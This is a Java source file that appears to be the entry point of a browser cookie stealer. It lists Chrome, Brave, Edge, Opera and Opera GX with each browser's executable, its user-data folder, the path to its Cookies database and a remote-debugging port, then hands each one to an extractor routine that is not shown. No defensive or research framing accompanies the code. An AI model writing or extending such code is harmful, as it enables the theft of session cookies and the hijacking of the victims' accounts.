package org.universal;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Main {
    private static final String PF = System.getenv("ProgramFiles");
    private static final String PF86 = System.getenv("ProgramFiles(x86)");

    public static void main(String[] args) {
        List<Config> browsers = new ArrayList<>();

        // Chrome
        browsers.add(new Config("chrome",
                resolvePath(PF + "\\Google\\Chrome\\Application\\chrome.exe",
                        PF86 + "\\Google\\Chrome\\Application\\chrome.exe"),
                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data",
                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
                9222,
                "chrome.exe"
        ));

        // Brave
        browsers.add(new Config("brave",
                resolvePath(PF + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                        PF86 + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
                System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
                9223,
                "brave.exe"
        ));

        // Edge
        browsers.add(new Config("edge",
                resolvePath(PF + "\\Microsoft\\Edge\\Application\\msedge.exe",
                        PF86 + "\\Microsoft\\Edge\\Application\\msedge.exe"),
                System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data",
                System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
                9224,
                "msedge.exe"
        ));

        // Opera
        browsers.add(new Config("opera",
                "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Programs\\Opera\\launcher.exe",
                System.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
                System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Network\\Cookies",
                9225,
                "opera.exe"
        ));

        // Opera GX
        browsers.add(new Config("opera_gx",
                "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Programs\\Opera GX\\launcher.exe",
                System.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable",
                System.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Network\\Cookies",
                9226,
                "opera.exe"
        ));

        for (Config browser : browsers) {
            Extractor.run(browser);
        }

        System.out.println("All available browsers processed.");
    }

    private static String resolvePath(String path1, String path2) {
        File f1 = new File(path1);
        if (f1.exists()) return path1;
        File f2 = new File(path2);
        if (f2.exists()) return path2;
        return path1; // fallback to default
    }
}
